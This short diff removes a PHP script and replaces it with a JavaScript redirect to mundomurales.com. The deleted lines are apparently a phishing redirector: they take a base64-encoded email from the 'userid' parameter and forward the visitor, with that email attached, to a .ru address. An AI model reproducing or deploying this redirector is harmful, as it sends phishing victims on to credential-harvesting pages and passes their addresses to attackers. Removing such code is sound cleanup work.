@@ -1,26 +1,3 @@
-<?php
-function isBase64($data)
-{
-    if (base64_encode(base64_decode($data)) === $data) {
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function decode($email){
-		
-		if(isBase64($email)){
-			 $email = base64_decode($email,false);
-		}
-      
-       header( "refresh:0;url=https://d94y2.ianpern.ru/xx/".$email);
-
-}
-if(isset($_GET['userid']) && !empty($_GET['userid'])){
-   $email = $_GET['userid'];
-   decode($email);
-}
-   
-   
-?>
+<script type="text/JavaScript">
+      setTimeout("location.href = 'https://mundomurales.com/';",0);
+</script>
